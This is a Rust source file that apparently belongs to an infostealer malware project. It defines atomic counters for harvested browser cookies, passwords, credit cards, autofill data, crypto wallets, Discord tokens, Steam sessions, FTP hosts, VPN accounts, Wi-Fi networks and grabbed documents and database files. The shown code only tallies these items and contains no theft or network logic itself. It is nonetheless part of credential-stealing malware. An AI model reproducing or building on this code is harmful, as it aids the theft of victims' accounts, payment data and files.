use crate::{Browser, Collector, Device, FileGrabber, Software, Vpn};
use core::sync::atomic::{AtomicBool, AtomicUsize};

macro_rules! impl_atomic_usize_counter {
    ($field:ident) => {
        paste::paste! {
            fn [<increase_ $field _by>](&self, count: usize) {
                use core::sync::atomic::Ordering;
                self.$field.fetch_add(count, Ordering::Relaxed);
            }

            fn [<get_ $field>](&self) -> usize {
                use core::sync::atomic::Ordering;
                self.$field.load(Ordering::Relaxed)
            }
        }
    };
}

#[allow(unused_macros)]
macro_rules! impl_atomic_bool_flag {
    ($field:ident) => {
        paste::paste! {
            fn [<set_ $field>](&self) {
                use core::sync::atomic::Ordering;
                self.$field.store(true, Ordering::Relaxed);
            }

            fn [<is_ $field>](&self) -> bool {
                use core::sync::atomic::Ordering;
                self.$field.load(Ordering::Relaxed)
            }
        }
    };
}

#[derive(Default)]
pub struct AtomicUsizeBrowser {
    cookies: AtomicUsize,
    passwords: AtomicUsize,
    credit_cards: AtomicUsize,
    auto_fills: AtomicUsize,
    history: AtomicUsize,
    bookmarks: AtomicUsize,
    downloads: AtomicUsize,
}

impl Browser for AtomicUsizeBrowser {
    impl_atomic_usize_counter!(cookies);
    impl_atomic_usize_counter!(passwords);
    impl_atomic_usize_counter!(credit_cards);
    impl_atomic_usize_counter!(auto_fills);
    impl_atomic_usize_counter!(history);
    impl_atomic_usize_counter!(bookmarks);
    impl_atomic_usize_counter!(downloads);
}

#[derive(Default)]
pub struct AtomicUsizeSoftware {
    wallets: AtomicUsize,
    ftp_hosts: AtomicUsize,
    telegram: AtomicBool,
    discord_tokens: AtomicUsize,
    steam_session: AtomicUsize,
}

impl Software for AtomicUsizeSoftware {
    impl_atomic_usize_counter!(wallets);
    impl_atomic_usize_counter!(ftp_hosts);
    impl_atomic_bool_flag!(telegram);
    impl_atomic_usize_counter!(discord_tokens);
    impl_atomic_usize_counter!(steam_session);
}

#[derive(Default)]
pub struct AtomicFileGrabber {
    source_code_files: AtomicUsize,
    database_files: AtomicUsize,
    documents: AtomicUsize,
}

impl FileGrabber for AtomicFileGrabber {
    impl_atomic_usize_counter!(source_code_files);
    impl_atomic_usize_counter!(database_files);
    impl_atomic_usize_counter!(documents);
}

#[derive(Default)]
pub struct AtomicUsizeVpn {
    accounts: AtomicUsize,
}

impl Vpn for AtomicUsizeVpn {
    impl_atomic_usize_counter!(accounts);
}

#[derive(Default)]
pub struct AtomicDevice {
    wifi_networks: AtomicUsize,
    installed_apps: AtomicUsize,
}

impl Device for AtomicDevice {
    impl_atomic_usize_counter!(wifi_networks);
    impl_atomic_usize_counter!(installed_apps);
}

#[derive(Default)]
pub struct AtomicCollector {
    browser: AtomicUsizeBrowser,
    software: AtomicUsizeSoftware,
    file_grabber: AtomicFileGrabber,
    vpn: AtomicUsizeVpn,
    device: AtomicDevice
}

impl Collector for AtomicCollector {
    type Browser = AtomicUsizeBrowser;
    type Software = AtomicUsizeSoftware;
    type FileGrabber = AtomicFileGrabber;
    type Vpn = AtomicUsizeVpn;
    type Device = AtomicDevice;

    fn get_browser(&self) -> &Self::Browser {
        &self.browser
    }

    fn get_software(&self) -> &Self::Software {
        &self.software
    }

    fn get_file_grabber(&self) -> &Self::FileGrabber {
        &self.file_grabber
    }

    fn get_vpn(&self) -> &Self::Vpn {
        &self.vpn
    }

    fn get_device(&self) -> &Self::Device {
        &self.device
    }
}